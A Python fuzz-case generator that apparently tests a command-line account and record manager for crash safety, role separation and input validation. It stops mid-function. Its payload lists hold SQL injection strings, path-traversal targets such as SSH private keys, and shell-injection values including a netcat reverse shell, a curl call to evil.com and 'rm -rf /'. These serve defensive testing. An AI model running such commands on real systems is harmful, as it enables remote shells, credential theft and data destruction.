#!/usr/bin/env python3
"""
fuzz_gen.py — ABA Fuzz Case Generator
Writes commands to stdout (piped to ABA) and a JSON-Lines manifest
to fuzz_manifest.jsonl so fuzz_check.py can verify expected outcomes.

Usage:
    python3 fuzz_gen.py [--seed N] > commands.txt
    python3 fuzz_gen.py | python3 aba.py --fuzz | python3 fuzz_check.py > results.txt
"""

import json
import os
import random
import string
import sys

SEED = int(sys.argv[sys.argv.index('--seed') + 1]) if '--seed' in sys.argv else 42
random.seed(SEED)
MANIFEST_FILE = 'fuzz_manifest.jsonl'

# ── Payload libraries ─────────────────────────────────────────────────────────

SQL = [
    "' OR '1'='1",          "'; DROP TABLE users; --",
    "1 UNION SELECT 1,2,3", "admin'--",
    "' OR 1=1--",           "1; SELECT * FROM records",
    "' AND 1=1--",          "1' ORDER BY 1--",
    "' GROUP BY 1--",       "' HAVING 1=1--",
    "'; EXEC xp_cmdshell('id')--",
    "1 AND SLEEP(5)--",     "' UNION SELECT NULL--",
    "1 OR '1'='1",          "') OR ('a'='a",
    "1; INSERT INTO u VALUES(1)", "' OR ''='",
    "1 AND 1=2--",          "' OR 'x'='x",
    "1=1--",
]

SHELL = [
    "; ls -la",             "| cat /etc/passwd",
    "`whoami`",             "$(id)",
    "&& rm -rf /",          "; rm -rf /",
    "| head .aba_key",      "$(cat .aba_db)",
    "; echo PWNED",         "| nc -e /bin/bash 127.0.0.1 4444",
    "& id",                 "|| id",
    "`id`",                 "$(uname -a)",
    "; curl evil.com/x",    "| base64 .aba_db",
    "`ls -la`",             "; python3 -c 'import os;os.system(\"id\")'",
    "$(echo INJECTED)",     "&& cat .aba_key",
]

PATH_TRAV = [
    "../../../etc/passwd",  "../../.aba_db",
    "../.aba_key",          "../../../tmp/evil",
    "/etc/passwd",          "/root/.ssh/id_rsa",
    "~/.ssh/id_rsa",        "..%2F..%2Fetc%2Fpasswd",
    "....//....//etc/passwd", ".." + os.sep + ".." + os.sep + "etc" + os.sep + "passwd",
                              ]

FORMAT_STR = [
    "%s", "%n", "%x%x%x%x", "%d", "%s%s%s%s%s",
    "%.1000d", "%1000s", "%(name)s", "{0}", "{name}",
    "%08x", "%p", "AAAA%n", "%s%s%s", "%99999s",
]

LONG = {65: 'A'*65, 100: 'B'*100, 256: 'C'*256, 1000: 'D'*1000}

UNICODE = [
    "用户名", "пароль", "مرحبا", "日本語",
    "Ñoño", "αβγδε", "∑∫∂≠", "💀🔥👾",
]

WEAK_PW = [
    "password", "123456", "abc", "short",
    "NOLOWER1!", "nouppercase1!", "NoDigits!", "",
    "a", "A"*25,
         ]

INVALID_CMDS = [
    "lin", "lIN", "LOGIN", "QUIT", "SHELL", "EXEC",
    "SUDO", "SU", "ROOT", "CMD", "RUN", "BASH",
    "LS", "CAT", "RM", "CP", "WGET", "CURL",
    "123", "!@#", "''", '""', "NULL", "TRUE",
    "undefined", "none", "nil", "A"*100,
                                ]

ALL_PAYLOADS = SQL + SHELL + FORMAT_STR + UNICODE

# Known credentials (set by aba.py --fuzz init)
ADMIN_PW = "FuzzAdmin1!"
U1_PW    = "FuzzU1new!"
U2_PW    = "FuzzU2new!"
LOCK_PW  = "FuzzLkn1!"

# ── Manifest helpers ──────────────────────────────────────────────────────────

manifest = []
seq      = 0

def _check(type_, value):
    return {"type": type_, "value": value}

def has(v):     return _check("contains",     v)
def hasnt(v):   return _check("not_contains", v)
def no_crash(): return hasnt("Traceback")
def no_reflect(payload): return hasnt(payload[:30])   # payload not echoed back

def emit(cmd: str, checks: list, category: str, desc: str):
    global seq
    manifest.append({
        "seq":      seq,
        "cmd":      cmd,
        "category": category,
        "desc":     desc,
        "checks":   checks,
    })
    print(cmd, flush=True)
    seq += 1

# ── Test state tracker ────────────────────────────────────────────────────────

class State:
    """Lightweight state machine to predict expected ABA outputs."""
    def __init__(self):
        self.logged_in = False
        self.user = None
        self.is_admin = False
        self.fails = {}          # user -> consecutive fail count
        self.locked = set()      # locked users
        self.known_users = {"admin": ADMIN_PW, "fuzz_u1": U1_PW,
                            "fuzz_u2": U2_PW,  "fuzz_lock": LOCK_PW}
        self.records = {}        # user -> set of record_ids

    def expect_login(self, user, pw):
        if self.logged_in:
            return "Already logged in"
        if user not in self.known_users:
            return "Invalid credentials"
        if user in self.locked:
            return "Account locked"
        if self.known_users[user] != pw:
            self.fails[user] = self.fails.get(user, 0) + 1
            if self.fails[user] >= 3:
                self.locked.add(user)
            return "Invalid credentials"
        self.fails[user] = 0
        self.logged_in = True
        self.user = user
        self.is_admin = (user == "admin")
        self.records.setdefault(user, set())
        return "OK"

    def do_logout(self):
        self.logged_in = False
        self.user = None
        self.is_admin = False

    def expect_record_op(self, rid=None, op="ADR"):
        if not self.logged_in:
            return "No active login session"
        if self.is_admin:
            return "Admin not authorized"
        if op == "ADR":
            if rid in self.records.get(self.user, set()):
                return "Duplicate recordID"
            return "OK"
        if op in ("DER", "EDR", "RER"):
            if rid not in self.records.get(self.user, set()):
                return "RecordID not found"
            return "OK"
        return "OK"

    def expect_admin_op(self):
        if not self.logged_in:
            return "No active login session"
        if not self.is_admin:
            return "Admin not authorized"
        return "OK"

S = State()


# ═════════════════════════════════════════════════════════════════════════════
# SECTION 0 — SETUP: create test users via admin
# ═════════════════════════════════════════════════════════════════════════════

def setup():
    # Admin login (password pre-seeded by --fuzz init)
    result = S.expect_login("admin", ADMIN_PW)
    emit(f"LIN admin {ADMIN_PW}",
         [has(result), no_crash()], "setup", "admin login for setup")

    for uid, pw in [("fuzz_u1", "FuzzU1tmp!"),
                    ("fuzz_u2", "FuzzU2tmp!"),
                    ("fuzz_lock", "FuzzLktmp!")]:
        emit(f"ADU {uid}",
             [has("OK"), no_crash()], "setup", f"create {uid}")
        emit(f"RPW {uid} {pw}",
             [has("OK"), no_crash()], "setup", f"set temp pw for {uid}")

    emit("LOU", [has("OK"), no_crash()], "setup", "admin logout")
    S.do_logout()

    # First-login for each test user (fuzz mode: LIN user tmpPW newPW newPW)
    for uid, tmp, new_pw in [("fuzz_u1", "FuzzU1tmp!", U1_PW),
                             ("fuzz_u2", "FuzzU2tmp!", U2_PW),
                             ("fuzz_lock", "FuzzLktmp!", LOCK_PW)]:
        emit(f"LIN {uid} {tmp} {new_pw} {new_pw}",
             [has("OK"), no_crash()], "setup", f"{uid} first login")
        emit("LOU", [has("OK"), no_crash()], "setup", f"{uid} logout")
    S.known_users.update({"fuzz_u1": U1_PW, "fuzz_u2": U2_PW,
                          "fuzz_lock": LOCK_PW})


# ═════════════════════════════════════════════════════════════════════════════
# SECTION 1 — UNAUTHENTICATED ACCESS (all auth-required commands w/o login)
# ═════════════════════════════════════════════════════════════════════════════

def cat_unauth():
    commands_no_auth = [
        ("LOU",                                              "No active login session"),
        ("CHP OldPass1! NewPass1! NewPass1!",                "No active login session"),
        ("ADU newuser",                                      "No active login session"),
        ("DEU someuser",                                     "No active login session"),
        ("LSU",                                              "No active login session"),
        ("RPW someuser NewPass1!",                           "No active login session"),
        ("DAL",                                              "No active login session"),
        ("ADR r001 name=Alice address=123St phone=5551234",  "No active login session"),
        ("DER r001",                                         "No active login session"),
        ("EDR r001 name=Bob",                                "No active login session"),
        ("RER",                                              "No active login session"),
        ("IMD import.csv",                                   "No active login session"),
        ("EXD export.bin",                                   "No active login session"),
    ]
    for cmd, exp in commands_no_auth:
        emit(cmd, [has(exp), no_crash()], "unauth", f"unauth: {cmd[:25]}")

    # Injection payloads as args when not authenticated
    for p in ALL_PAYLOADS[:20]:
        safe_p = p.replace('"', "'")
        emit(f"ADR {safe_p} name=x address=y phone=z",
             [has("No active login session"), no_crash(), no_reflect(p)],
             "unauth_injection", "unauth injection in recordID position")

    # Path traversal when not authenticated
    for p in PATH_TRAV:
        emit(f"IMD {p}",
             [has("No active login session"), no_crash()],
             "unauth_path", "unauth path traversal")


# ═════════════════════════════════════════════════════════════════════════════
# SECTION 2 — LOGIN FUZZING
# ═════════════════════════════════════════════════════════════════════════════

def cat_auth():
    # 2a. Wrong passwords for admin (50 random wrong passwords)
    wrong_pws = (
            WEAK_PW
            + [random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$", k=12)
               for _ in range(20)]
            + ["".join(random.choices("abcABC123!@#", k=random.randint(1, 30))) for _ in range(20)]
    )
    for pw in wrong_pws[:50]:
        pw_str = "".join(pw) if isinstance(pw, list) else str(pw)
        # Sanitize for command line (no spaces)
        pw_str = pw_str.replace(" ", "_") or "empty"
        emit(f"LIN admin {pw_str}",
             [has("Invalid credentials"), no_crash()],
             "auth_wrong_pw", f"wrong admin pw: {repr(pw_str)[:20]}")

    # 2b. Injection payloads as passwords
    for p in SQL[:10]:
        safe = p.replace(" ", "_").replace("'", "QUOTE")
        emit(f"LIN admin {safe}",
             [has("Invalid credentials"), no_crash(), no_reflect(p[:20])],
             "auth_sql_pw", "SQL injection as password")

    for p in SHELL[:10]:
        safe = p.replace(" ", "_").replace(";", "SEMI").replace("|", "PIPE")
        emit(f"LIN admin {safe}",
             [has("Invalid credentials"), no_crash()],
             "auth_shell_pw", "shell injection as password")

    # 2c. Non-existent usernames (including injections)
    for user in ["ghost", "nobody", "root", "' OR 1=1--", "admin2",
                 "A"*16, "A"*17, "用户", "fuzz_u9"]:
        safe = user.replace(" ", "_").replace("'", "Q")
        emit(f"LIN {safe} SomePass1!",
             [has("Invalid credentials"), no_crash()],
             "auth_bad_user", f"nonexistent user: {safe[:15]}")

    # 2d. Lockout sequence on fuzz_lock account
    #     3 wrong → locked; then correct → still locked
    for i in range(3):
        emit(f"LIN fuzz_lock WrongPass{i}!",
             [has("Invalid credentials"), no_crash()],
             "auth_lockout", f"lockout attempt {i+1}/3")
    S.locked.add("fuzz_lock")

    emit(f"LIN fuzz_lock WrongPass4!",
         [has("Account locked"), no_crash()],
         "auth_lockout", "attempt after lockout (wrong pw)")

    emit(f"LIN fuzz_lock {LOCK_PW}",
         [has("Account locked"), no_crash()],
         "auth_lockout", "attempt after lockout (correct pw)")

    # 2e. Boundary username lengths
    emit(f"LIN {'a'*16} SomePass1!",
         [has("Invalid credentials"), no_crash()],
         "auth_boundary", "username at max 16 chars")

    emit(f"LIN {'a'*17} SomePass1!",
         [has("Invalid credentials"), no_crash()],
         "auth_boundary", "username over max (17 chars)")

    # 2f. Valid login and then duplicate login
    res = S.expect_login("admin", ADMIN_PW)
    emit(f"LIN admin {ADMIN_PW}",
         [has(res), no_crash()], "auth_valid", "valid admin login")

    emit(f"LIN admin {ADMIN_PW}",
         [has("Already logged in"), no_crash()],
         "auth_duplicate", "duplicate login attempt")

    emit("LOU", [has("OK"), no_crash()], "auth_valid", "admin logout")
    S.do_logout()

    # 2g. Login as user, immediate re-login (while logged in)
    S.expect_login("fuzz_u1", U1_PW)
    emit(f"LIN fuzz_u1 {U1_PW}",
         [has("OK"), no_crash()], "auth_valid", "user login ok")
    emit(f"LIN admin {ADMIN_PW}",
         [has("Already logged in"), no_crash()],
         "auth_duplicate", "login while user active")
    emit("LOU", [has("OK"), no_crash()], "auth_valid", "user logout")
    S.do_logout()

    # 2h. Format strings as username and password
    for p in FORMAT_STR[:10]:
        safe = p.replace(" ", "_")
        emit(f"LIN {safe} SomePass1!",
             [has("Invalid credentials"), no_crash(), no_reflect(p)],
             "auth_format", "format string as username")
        emit(f"LIN admin {safe}",
             [has("Invalid credentials"), no_crash(), no_reflect(p)],
             "auth_format", "format string as password")


# ═════════════════════════════════════════════════════════════════════════════
# SECTION 3 — PASSWORD POLICY FUZZING
# ═════════════════════════════════════════════════════════════════════════════

def cat_password():
    S.expect_login("admin", ADMIN_PW)
    emit(f"LIN admin {ADMIN_PW}",
         [has("OK"), no_crash()], "pw_setup", "admin login for pw tests")

    # 3a. CHP with weak new passwords
    for pw in WEAK_PW:
        safe = (pw or "empty").replace(" ", "_")
        emit(f"CHP {ADMIN_PW} {safe} {safe}",
             [hasnt("OK"), no_crash()],
             "pw_weak", f"CHP weak pw: {repr(safe)[:20]}")

    # 3b. CHP wrong old password
    emit(f"CHP WrongOld1! NewValid1! NewValid1!",
         [has("Invalid credentials"), no_crash()],
         "pw_wrong_old", "CHP wrong old password")

    # 3c. CHP mismatched confirmation
    emit(f"CHP {ADMIN_PW} NewValid1! DiffValid2!",
         [has("Passwords do not match"), no_crash()],
         "pw_mismatch", "CHP confirmation mismatch")

    # 3d. CHP with injection in new password
    for p in SQL[:5]:
        safe = p.replace(" ", "_").replace("'", "Q").replace(";", "S")
        emit(f"CHP {ADMIN_PW} {safe} {safe}",
             [no_crash(), hasnt("Traceback")],
             "pw_injection", "CHP injection in new password")

    # 3e. CHP with very long passwords (over 24-char max)
    emit(f"CHP {ADMIN_PW} {'A'*25}a1! {'A'*25}a1!",
         [hasnt("OK"), no_crash()],
         "pw_too_long", "CHP password over 24 chars")

    # 3f. Valid CHP (keep admin usable for rest of tests)
    emit(f"CHP {ADMIN_PW} {ADMIN_PW} {ADMIN_PW}",
         [has("OK"), no_crash()],
         "pw_valid", "CHP valid (keeps same password)")

    emit("LOU", [has("OK"), no_crash()], "pw_setup", "admin logout after pw tests")
    S.do_logout()


# ═════════════════════════════════════════════════════════════════════════════
# SECTION 4 — RECORD CRUD FUZZING
# ═════════════════════════════════════════════════════════════════════════════

def cat_records():
    # Login as fuzz_u1
    S.expect_login("fuzz_u1", U1_PW)
    emit(f"LIN fuzz_u1 {U1_PW}",
         [has("OK"), no_crash()], "crud_setup", "user login for record tests")

    # 4a. Valid record adds
    valid_records = [
        ("r001", "Alice Smith",    "123 Main St",     "555-0001"),
        ("r002", "Bob Jones",      "456 Oak Ave",      "555-0002"),
        ("r003", "Carol Williams", "789 Pine Rd",      "555-0003"),
        ("r004", "Dave Brown",     "321 Elm Blvd",     "555-0004"),
        ("r005", "Eve Davis",      "654 Cedar Ln",     "555-0005"),
    ]
    for rid, name, addr, phone in valid_records:
        emit(f"ADR {rid} name={name.replace(' ','_')} address={addr.replace(' ','_')} phone={phone}",
             [has("OK"), no_crash()], "crud_valid", f"ADR {rid}")
        S.records.setdefault("fuzz_u1", set()).add(rid)

    # 4b. Duplicate recordID
    emit("ADR r001 name=Dup address=DupSt phone=000",
         [has("Duplicate recordID"), no_crash()],
         "crud_dup", "ADR duplicate recordID")

    # 4c. Missing required fields
    emit("ADR r010 name=OnlyName",
         [has("Invalid or missing fields"), no_crash()],
         "crud_missing", "ADR missing address and phone")
    emit("ADR r010",
         [has("Invalid or missing fields"), no_crash()],
         "crud_missing", "ADR no fields at all")
    emit("ADR r010 address=Only",
         [has("Invalid or missing fields"), no_crash()],
         "crud_missing", "ADR only address field")

    # 4d. Field value exactly at limit (64 chars) — should succeed
    name_64 = "N" * 64
    emit(f"ADR r_max name={name_64} address=ValidAddr phone=5550064",
         [has("OK"), no_crash()], "crud_boundary", "ADR field at max 64 chars")
    S.records.setdefault("fuzz_u1", set()).add("r_max")

    # 4e. Field value over limit (65 chars)
    name_65 = "O" * 65
    emit(f"ADR r_over name={name_65} address=ValidAddr phone=5550065",
         [hasnt("OK"), no_crash()], "crud_boundary", "ADR field 65 chars (over max)")

    # 4f. Invalid recordID formats
    for bad_id in ["r 001", "r@001", "r#001", ""]:
        safe = bad_id.replace(" ", "_") or "empty"
        emit(f"ADR {safe} name=Test address=TestSt phone=0000",
             [hasnt("OK"), no_crash()], "crud_bad_id", f"ADR bad recordID: {repr(bad_id)}")

    # 4g. RecordID exactly 64 chars (at limit)
    emit(f"ADR {'a'*64} name=AtLimit address=AtLimitSt phone=5550064",
         [has("OK"), no_crash()], "crud_boundary", "ADR recordID 64 chars (at limit)")
    S.records.setdefault("fuzz_u1", set()).add("a"*64)

    # 4h. RecordID 65 chars (over limit) — should fail
    emit(f"ADR {'b'*65} name=OverLimit address=OverSt phone=5550065",
         [hasnt("OK"), no_crash()], "crud_boundary", "ADR recordID 65 chars (over limit)")

    # 4i. Get valid record
    emit("RER r001",
         [has("OK"), no_crash()], "crud_valid", "RER existing record")

    # 4j. Get non-existent record
    emit("RER r999",
         [has("RecordID not found"), no_crash()],
         "crud_notfound", "RER non-existent record")

    # 4k. Get all records
    emit("RER", [has("OK"), no_crash()], "crud_valid", "RER all records")

    # 4l. Edit valid record
    emit("EDR r001 name=UpdatedAlice",
         [has("OK"), no_crash()], "crud_valid", "EDR valid record")

    # 4m. Edit non-existent record
    emit("EDR r999 name=Ghost",
         [has("RecordID not found"), no_crash()],
         "crud_notfound", "EDR non-existent record")

    # 4n. Delete valid record
    emit("DER r002",
         [has("OK"), no_crash()], "crud_valid", "DER existing record")
    S.records["fuzz_u1"].discard("r002")

    # 4o. Delete non-existent record
    emit("DER r999",
         [has("RecordID not found"), no_crash()],
         "crud_notfound", "DER non-existent record")

    # 4p. Delete already-deleted record (idempotency test)
    emit("DER r002",
         [has("RecordID not found"), no_crash()],
         "crud_notfound", "DER already-deleted record")

    emit("LOU", [has("OK"), no_crash()], "crud_setup", "user logout after CRUD")
    S.do_logout()


# ═════════════════════════════════════════════════════════════════════════════
# SECTION 5 — INJECTION ATTACKS IN RECORD FIELDS
# ═════════════════════════════════════════════════════════════════════════════

def cat_injection():
    S.expect_login("fuzz_u2", U2_PW)
    emit(f"LIN fuzz_u2 {U2_PW}",
         [has("OK"), no_crash()], "inj_setup", "user login for injection tests")

    rid_counter = [0]

    def inj(rid, name="SafeName", address="SafeAddr", phone="5550000",
            field="name", payload="", category="injection"):
        rid_counter[0] += 1
        rname   = payload if field == "name"    else name
        raddr   = payload if field == "address" else address
        rphone  = payload if field == "phone"   else phone
        rname   = rname.replace(" ", "_")
        raddr   = raddr.replace(" ", "_")
        rphone  = rphone.replace(" ", "_")
        safe_rid = f"inj{rid_counter[0]:04d}"
        emit(f"ADR {safe_rid} name={rname} address={raddr} phone={rphone}",
             [no_crash(), hasnt("Traceback"),
              hasnt(payload[:20].replace(" ","_"))],
             category, f"injection in {field}: {repr(payload)[:30]}")

    # SQL injection in each field position
    for p in SQL:
        inj(None, payload=p, field="name",    category="inj_sql_name")
    for p in SQL:
        inj(None, payload=p, field="address", category="inj_sql_addr")
    for p in SQL[:10]:
        inj(None, payload=p, field="phone",   category="inj_sql_phone")

    # Shell injection in each field position
    for p in SHELL:
        inj(None, payload=p, field="name",    category="inj_shell_name")
    for p in SHELL:
        inj(None, payload=p, field="address", category="inj_shell_addr")
    for p in SHELL[:10]:
        inj(None, payload=p, field="phone",   category="inj_shell_phone")

    # Format strings in each field position
    for p in FORMAT_STR:
        inj(None, payload=p, field="name",    category="inj_fmt_name")
    for p in FORMAT_STR:
        inj(None, payload=p, field="address", category="inj_fmt_addr")

    # Unicode in fields (valid data — should work)
    for p in UNICODE:
        emit(f"ADR inj_uni_{rid_counter[0]:04d} name={p} address=SafeAddr phone=5550000",
             [no_crash()], "inj_unicode", f"unicode in name: {p[:10]}")
        rid_counter[0] += 1

    # Injection in recordID position
    for p in (SQL[:5] + SHELL[:5] + FORMAT_STR[:5]):
        safe_rid = p.replace(" ","_").replace("'","Q").replace(";","S").replace("|","P")[:20]
        emit(f"ADR {safe_rid} name=Test address=TestSt phone=5559999",
             [no_crash(), hasnt("Traceback")],
             "inj_recordid", f"injection as recordID: {repr(p)[:20]}")

    # Injection in EDR fields (editing existing record)
    emit("ADR r_inj_base name=Base address=BaseAddr phone=5550099",
         [no_crash()], "inj_setup", "base record for EDR injection")
    for p in SQL[:10]:
        safe = p.replace(" ","_").replace("'","Q")
        emit(f"EDR r_inj_base name={safe}",
             [no_crash(), hasnt("Traceback")],
             "inj_edr_sql", f"SQL injection in EDR: {repr(p)[:20]}")
    for p in SHELL[:10]:
        safe = p.replace(" ","_").replace(";","S").replace("|","P")
        emit(f"EDR r_inj_base name={safe}",
             [no_crash(), hasnt("Traceback")],
             "inj_edr_shell", f"shell injection in EDR: {repr(p)[:20]}")

    emit("LOU", [has("OK"), no_crash()], "inj_setup", "user logout after injection tests")
    S.do_logout()


# ═════════════════════════════════════════════════════════════════════════════
# SECTION 6 — FILE OPERATION FUZZING (IMD / EXD)
# ═════════════════════════════════════════════════════════════════════════════

def cat_file_ops():
    S.expect_login("fuzz_u1", U1_PW)
    emit(f"LIN fuzz_u1 {U1_PW}",
         [has("OK"), no_crash()], "file_setup", "user login for file tests")

    # 6a. Path traversal in EXD
    for p in PATH_TRAV:
        safe = p.replace(" ", "_")
        emit(f"EXD {safe}",
             [has("Path traversal"), no_crash()],
             "file_path_exd", f"EXD path traversal: {p[:30]}")

    # 6b. Path traversal in IMD
    for p in PATH_TRAV:
        safe = p.replace(" ", "_")
        emit(f"IMD {safe}",
             [has("Path traversal"), no_crash()],
             "file_path_imd", f"IMD path traversal: {p[:30]}")

    # 6c. IMD with non-existent file
    emit("IMD nonexistent_file.csv",
         [has("Cannot open file"), no_crash()],
         "file_notfound", "IMD non-existent file")

    # 6d. IMD with injection in filepath
    for p in SHELL[:5]:
        safe = p.replace(" ","_").replace(";","S").replace("|","P").replace("&","A")
        emit(f"IMD {safe}",
             [no_crash(), hasnt("Traceback")],
             "file_inj_path", f"IMD injection in path: {repr(p)[:20]}")

    # 6e. EXD with valid path — should work (we have records from CRUD section)
    emit("EXD fuzz_export_test.bin",
         [has("OK"), no_crash()],
         "file_export_valid", "EXD valid export")

    # 6f. EXD — absolute path rejected
    emit("EXD /tmp/evil_export.bin",
         [has("Path traversal"), no_crash()],
         "file_abs_path", "EXD absolute path rejected")

    # 6g. IMD — injection in CSV content (valid file path, malicious content)
    # Create a CSV with SQL and shell injection in fields
    import csv, os
    bad_csv = "fuzz_bad_import.csv"
    with open(bad_csv, 'w', newline='') as f:
        w = csv.writer(f, delimiter=';')
        w.writerow(['recordID','name','address','phone'])
        w.writerow(['good_imp', 'Safe Person', 'Safe Address', '555-0001'])
        w.writerow(['sql_inj',  "' OR '1'='1", 'SQL Street', '555-0002'])
        w.writerow(['shell_inj','$(whoami)',    'Shell Blvd',  '555-0003'])
        w.writerow(['fmt_inj',  '%s%s%s',       'Fmt Ave',     '555-0004'])
        w.writerow(['good_imp2','Another Safe', '123 Safe Rd', '555-0005'])

    emit(f"IMD {bad_csv}",
         [has("Import complete"), no_crash(), hasnt("Traceback")],
         "file_import_content", "IMD file with injections in content (skipped)")

    # 6h. IMD with missing headers
    bad_csv2 = "fuzz_no_header.csv"
    with open(bad_csv2, 'w') as f:
        f.write("Alice,123 Main St,555-0001\nBob,456 Oak Ave,555-0002\n")
    emit(f"IMD {bad_csv2}",
         [no_crash(), hasnt("Traceback")],
         "file_import_noheader", "IMD file with no proper header")

    emit("LOU", [has("OK"), no_crash()], "file_setup", "user logout after file tests")
    S.do_logout()


# ═════════════════════════════════════════════════════════════════════════════
# SECTION 7 — ADMIN OPERATION FUZZING
# ═════════════════════════════════════════════════════════════════════════════

def cat_admin():
    S.expect_login("admin", ADMIN_PW)
    emit(f"LIN admin {ADMIN_PW}",
         [has("OK"), no_crash()], "admin_setup", "admin login for admin tests")

    # 7a. Admin trying record commands (all blocked per BR-2)
    for cmd in [
        "ADR r_admin name=AdminRec address=AdminSt phone=5550099",
        "DER r001",
        "EDR r001 name=AdminEdit",
        "RER",
        "RER r001",
        "IMD some_file.csv",
        "EXD some_export.bin",
    ]:
        emit(cmd, [has("Admin not authorized"), no_crash()],
             "admin_record_block", f"admin blocked from: {cmd[:25]}")

    # 7b. ADU with injection in username
    for p in SQL[:5]:
        safe = p.replace(" ","_").replace("'","Q").replace(";","S")[:16]
        emit(f"ADU {safe}",
             [no_crash(), hasnt("Traceback")],
             "admin_adu_inj", f"ADU SQL injection username: {repr(p)[:15]}")

    for p in SHELL[:5]:
        safe = p.replace(" ","_").replace(";","S").replace("|","P").replace("&","A")[:16]
        emit(f"ADU {safe}",
             [no_crash(), hasnt("Traceback")],
             "admin_adu_inj", f"ADU shell injection username: {repr(p)[:15]}")

    # 7c. ADU with invalid format
    for bad in ["bad user", "bad!user", "bad@user", "a"*17, "", " "]:
        safe = bad.replace(" ","_") or "empty"
        emit(f"ADU {safe}",
             [hasnt("OK"), no_crash()],
             "admin_adu_bad", f"ADU invalid username: {repr(bad)[:15]}")

    # 7d. ADU duplicate
    emit("ADU fuzz_u1",
         [has("Account already exists"), no_crash()],
         "admin_adu_dup", "ADU duplicate username")

    # 7e. DEU non-existent
    emit("DEU nonexistent_user",
         [has("Account does not exist"), no_crash()],
         "admin_deu_notfound", "DEU non-existent user")

    # 7f. DEU self
    emit("DEU admin",
         [has("Cannot delete"), no_crash()],
         "admin_deu_self", "DEU admin self-delete blocked")

    # 7g. RPW self (should use CHP instead)
    emit(f"RPW admin {ADMIN_PW}",
         [has("Use CHP"), no_crash()],
         "admin_rpw_self", "RPW self blocked")

    # 7h. RPW non-existent user
    emit("RPW nonexistent NewPass1!",
         [has("Account does not exist"), no_crash()],
         "admin_rpw_notfound", "RPW non-existent user")

    # 7i. RPW with weak password
    for pw in WEAK_PW[:5]:
        safe = (pw or "empty").replace(" ", "_")
        emit(f"RPW fuzz_u2 {safe}",
             [hasnt("OK"), no_crash()],
             "admin_rpw_weak", f"RPW weak password: {repr(safe)[:15]}")

    # 7j. LSU shows users (no admin)
    emit("LSU",
         [has("OK"), hasnt("admin"), no_crash()],
         "admin_lsu", "LSU lists users (admin excluded)")

    # 7k. DAL with and without user filter
    emit("DAL",
         [has("OK"), no_crash()],
         "admin_dal", "DAL display all audit log")
    emit("DAL fuzz_u1",
         [has("OK"), no_crash()],
         "admin_dal_filter", "DAL filter by user")

    # 7l. DAL with injection in filter
    for p in SQL[:5]:
        safe = p.replace(" ","_").replace("'","Q")
        emit(f"DAL {safe}",
             [no_crash(), hasnt("Traceback")],
             "admin_dal_inj", f"DAL injection in filter: {repr(p)[:15]}")

    emit("LOU", [has("OK"), no_crash()], "admin_setup", "admin logout after admin tests")
    S.do_logout()


# ═════════════════════════════════════════════════════════════════════════════
# SECTION 8 — ROLE SEPARATION (user doing admin ops)
# ═════════════════════════════════════════════════════════════════════════════

def cat_role_sep():
    S.expect_login("fuzz_u1", U1_PW)
    emit(f"LIN fuzz_u1 {U1_PW}",
         [has("OK"), no_crash()], "role_setup", "user login for role tests")

    # Regular user trying admin commands
    for cmd in [
        "ADU newuser",
        "DEU fuzz_u2",
        "LSU",
        "RPW fuzz_u2 SomePass1!",
        "DAL",
        "DAL fuzz_u1",
    ]:
        emit(cmd, [has("Admin not authorized"), no_crash()],
             "role_sep", f"user blocked from admin cmd: {cmd[:20]}")

    emit("LOU", [has("OK"), no_crash()], "role_setup", "user logout after role tests")
    S.do_logout()


# ═════════════════════════════════════════════════════════════════════════════
# SECTION 9 — CLI EDGE CASES
# ═════════════════════════════════════════════════════════════════════════════

def cat_cli():
    # 9a. Unknown / misspelled commands (no login needed)
    for cmd in INVALID_CMDS:
        safe = cmd.replace(" ","_")
        emit(safe,
             [has("Unrecognized command"), no_crash()],
             "cli_unknown", f"unknown command: {safe[:20]}")

    # 9b. Commands with no args (when args are required)
    # (no login, so these hit auth check first)
    emit("ADR",
         [no_crash()], "cli_no_args", "ADR with no args")
    emit("DER",
         [no_crash()], "cli_no_args", "DER with no args")
    emit("EDR",
         [no_crash()], "cli_no_args", "EDR with no args")
    emit("IMD",
         [no_crash()], "cli_no_args", "IMD with no args")
    emit("EXD",
         [no_crash()], "cli_no_args", "EXD with no args")

    # 9c. HLP always works
    emit("HLP",
         [no_crash()], "cli_hlp", "HLP no args")
    for cmd in ["LIN","LOU","CHP","ADR","DER","EDR","RER","IMD",
                "EXD","ADU","DEU","LSU","RPW","DAL","HLP","EXT"]:
        emit(f"HLP {cmd}",
             [has(cmd), no_crash()], "cli_hlp_cmd", f"HLP {cmd}")

    # 9d. HLP for unknown command
    emit("HLP BADCMD",
         [has("Unknown command"), no_crash()],
         "cli_hlp_unknown", "HLP for unknown command")

    # 9e. Case insensitivity check (lowercase commands)
    for cmd in ["lin", "lou", "hlp", "ext", "rer", "adr", "der"]:
        emit(cmd,
             [no_crash()], "cli_case", f"lowercase command: {cmd}")

    # 9f. Very long lines
    for n in [100, 500, 1000, 4096]:
        emit("A" * n,
             [has("Unrecognized command"), no_crash()],
             "cli_long", f"very long command line ({n} chars)")

    # 9g. Commands with extra whitespace / empty tokens
    emit("  LOU  ",
         [no_crash()], "cli_whitespace", "command with extra whitespace")

    # 9h. Special chars in command position
    for c in ["!", "@", "#", "$", "%", "^", "&", "*", "(", ")", "+", "="]:
        emit(c,
             [has("Unrecognized command"), no_crash()],
             "cli_special_char", f"special char as command: {c}")

    # 9i. Null-like / whitespace-only inputs
    for inp in [" ", "   ", "\t", "0", "1", "-", "--"]:
        emit(inp,
             [no_crash()], "cli_null_like", f"null-like input: {repr(inp)}")


# ═════════════════════════════════════════════════════════════════════════════
# SECTION 10 — RANDOM FUZZ (algorithmically generated)
# ═════════════════════════════════════════════════════════════════════════════

def cat_random():
    """
    Pure random fuzzing: mutated commands and random field values.
    Verifies crash-safety only (no expected output, only no Traceback).
    """
    VALID_CMDS = ["LIN","LOU","CHP","ADR","DER","EDR","RER",
                  "IMD","EXD","ADU","DEU","LSU","RPW","DAL","HLP"]

    chars = (string.ascii_letters + string.digits
             + " !@#$%^&*()_+-=[]{}|;:',.<>?/`~")

    def rand_str(min_len=1, max_len=50):
        n = random.randint(min_len, max_len)
        return "".join(random.choices(chars, k=n))

    def rand_payload():
        return random.choice(ALL_PAYLOADS + [rand_str()])

    # Random command + random args
    for _ in range(150):
        cmd  = random.choice(VALID_CMDS + INVALID_CMDS[:10])
        args = " ".join(rand_str(1, 20).replace(" ","_")
                        for _ in range(random.randint(0, 4)))
        line = f"{cmd} {args}".strip()[:200]  # cap line length
        emit(line, [no_crash()], "random_cmd", f"random cmd: {line[:30]}")

    # Random ADR with mutated field values
